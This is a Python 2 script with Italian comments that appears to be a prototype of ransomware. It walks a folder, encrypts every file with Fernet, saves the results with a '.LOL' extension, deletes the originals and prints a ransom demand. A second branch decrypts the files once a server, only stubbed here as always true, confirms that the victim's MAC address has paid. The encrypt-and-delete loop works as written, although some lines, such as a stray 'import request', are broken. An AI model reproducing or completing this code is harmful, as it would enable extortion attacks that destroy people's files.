import os
import requests
from uuid import getnode as get_mac
from cryptography.fernet import Fernet


import request

def key_generation(key_path):
    # Put this somewhere safe!
    key = Fernet.generate_key()
    write_file(key_path, key)
    f = Fernet(key)

    print key

    return f


def key_recuva(key_path):
    key = open_file(key_path)
    f = Fernet(key)

    print key

    return f


def crypt(key, data):
    return key.encrypt(data)


def decrypt(key, data):
    return key.decrypt(data)


def open_file(file_name):
    #Read the entire file as a single byte string
    with open(file_name, 'rb') as f:
        data = f.read()

    return data


def write_file(path, file_string):
    with open(path, 'wb') as f:
        f.write(file_string)


def name_and_extension(path):
    name_file = os.path.splitext(os.path.basename(path))[0]
    ext = os.path.splitext(os.path.basename(path))[1]

    return name_file, ext


def still_MAC_Address():
    #transform the integer MAC Address into string with : symbol
    return str ( ':'.join(("%012X" % get_mac() )[i:i + 2] for i in range(0, 12, 2)))


def remove_file(path):
    os.remove(path)


"""Main"""

#MAC Address
mac = still_MAC_Address()
print mac

key_path = ''
key_name = 'kiavetta.key'
root_path = '.\Experiment'

# se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
# altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
# usala per crittare tutto
condition = False

if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
    # 1) Request "ifUserPayed(MACAddress)"
    # 2) if True Decrypt everything

    # Create the Request
    req = {"r": "ifUserPayed", "MAC": mac}
    # Send the request...and store the response here
    resp = True

    if resp:
        # key = db stored key...
        key = key_recuva(key_path+key_name)

        #for every file stored, decrypt everything
        for root, dirs, files in os.walk(root_path):
            for file in files:
                print(os.path.join(root, file))
                tmp_path = os.path.join(root, file)

                if tmp_path.endswith(".LOL"):
                    # Take the name file and the its extension
                    name_file, ext = name_and_extension(tmp_path)

                    # Open file as a string
                    file_string = open_file(tmp_path)

                    #Decrypt
                    file_tmp = decrypt(key, file_string)

                    #Create decrypted file
                    write_file(root+"\\"+name_file, file_tmp)

                    #Remove .LOL file
                    remove_file(tmp_path)

        #Remove kiavetta just for testing
        remove_file(key_path+key_name)

        condition = True


else:
    # 1) Request "newUser(MACAddress)" return Key
    # 2) crypt everything

    if not os.path.isfile("check.check"):
        # key = db stored key...
        key = key_generation(key_path+key_name)

        # for every file stored, crypt everything
        for root, dirs, files in os.walk(root_path):
            for file in files:
                print(os.path.join(root, file))
                tmp_path = os.path.join(root, file)

                # Open file as a string
                file_string = open_file(tmp_path)

                # File Encryption
                file_tmp = crypt(key, file_string)

                # Create a file with .LOL extension
                write_file(tmp_path + ".LOL", file_tmp)
                remove_file(tmp_path)

        write_file("check.check", "")

    var = raw_input("TUTTI I TUOI FILE SONO CRITTATI! VUOI PAGARE 1000MILA SOLDI?")
    if var.lower() == "si":
        # Send to Server Payment Request
        remove_file("check.check")
        print "SAGGIA SCELTA. FAI RIPARTIRE IL PROGRAMMA PER DECRITTARE TUTTO"
